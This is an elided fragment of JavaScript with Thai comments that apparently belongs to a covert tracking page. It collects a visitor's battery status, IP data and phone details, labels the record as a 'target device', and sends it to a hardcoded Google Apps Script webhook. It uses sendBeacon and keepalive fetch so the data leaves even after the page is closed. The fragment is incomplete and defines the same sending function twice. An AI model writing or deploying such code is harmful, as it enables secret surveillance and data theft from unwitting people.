  ...
  getBatteryInfo().then(batteryData => {
    ...
    .then(([ipData, phoneInfo]) => {
      ...
      dataToSend = {
        ...
        isTargetDevice: true // เพิ่มฟิลด์ใหม่ระบุว่าเป็นข้อมูลของเป้าหมาย
      };
...
function sendToLineNotify(dataToSend) {
  ...
  // ส่งข้อมูลด้วยการใช้ sendBeacon ถ้าเป็นไปได้ (เพื่อให้ส่งข้อมูลได้แม้จะปิดหน้าเว็บ)
  if (navigator.sendBeacon) {
    ...
    if (success) {
      console.log("ส่งข้อมูลด้วย sendBeacon สำเร็จ");
    ...
    console.log("sendBeacon ไม่สำเร็จ ลองใช้ fetch แทน");
  }

  // ถ้า sendBeacon ไม่สำเร็จหรือไม่รองรับ ให้ใช้ fetch แทน
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
    ...
    mode: 'no-cors',
    keepalive: true // ทำให้ request ดำเนินต่อแม้หน้าเว็บจะปิด
  })
  .then(() => {
...
// ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
function sendToLineNotify(dataToSend) {
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbx1zVPgAlG4B1naG1ALD8V6akYz35IZupc-pwr1AbUHihCc8qEAzV0D-PzI-3OCBdac/exec';
